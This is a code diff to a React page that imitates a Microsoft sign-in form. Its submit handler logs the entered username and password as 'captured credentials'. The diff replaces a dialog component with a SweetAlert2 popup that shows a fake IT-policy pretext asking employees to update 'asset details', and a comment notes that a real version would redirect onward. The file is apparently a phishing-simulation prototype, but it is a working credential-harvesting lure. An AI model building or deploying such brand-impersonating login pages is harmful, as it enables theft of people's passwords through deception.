@@ -1,19 +1,32 @@
 'use client';
 import { FormEvent, useState } from 'react';
-import { AlertDialog, AlertDialogAction, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle } from '@/components/ui/alert-dialog';
-import { Info } from 'lucide-react';
+
+// Make Swal available in the component
+declare const Swal: any;
 
 export default function Home() {
   const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";
 
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
-  const [showDialog, setShowDialog] = useState(false);
 
   const handleSubmit = (event: FormEvent) => {
     event.preventDefault();
     console.log('Captured credentials:', { username, password });
-    setShowDialog(true);
+    
+    // Show SweetAlert2 prompt
+    Swal.fire({
+      title: "Action Required: Employee Asset Details",
+      text: "Please review and update your asset information in accordance with the new IT policy.",
+      icon: "info",
+      confirmButtonText: "Update Now",
+      confirmButtonColor: "#3085d6",
+      background: "#fff",
+      color: "#333"
+    }).then(() => {
+      // In a real scenario, you would redirect. For this prototype, we do nothing.
+      console.log("Alert closed. Would redirect to employee-asset-update.html");
+    });
   };
   
   return (
@@ -48,29 +61,6 @@ export default function Home() {
           <small>© Microsoft Corporation</small>
         </form>
       </div>
-
-      <AlertDialog open={showDialog} onOpenChange={setShowDialog}>
-        <AlertDialogContent>
-          <AlertDialogHeader className="items-center">
-            <div className="flex h-12 w-12 items-center justify-center rounded-full border-4 border-blue-100 bg-blue-50 mb-4">
-              <Info className="h-8 w-8 text-blue-600" />
-            </div>
-            <AlertDialogTitle>Action Required: Employee Asset Details</AlertDialogTitle>
-            <AlertDialogDescription>
-              Please review and update your asset information in accordance with the new IT policy.
-            </AlertDialogDescription>
-          </AlertDialogHeader>
-          <AlertDialogFooter>
-            <AlertDialogAction 
-              onClick={() => setShowDialog(false)}
-              className="w-full bg-blue-500 hover:bg-blue-600 text-white"
-              style={{backgroundColor: '#3085d6'}}
-              >
-              Update Now
-            </AlertDialogAction>
-          </AlertDialogFooter>
-        </AlertDialogContent>
-      </AlertDialog>
     </>
   );
 }
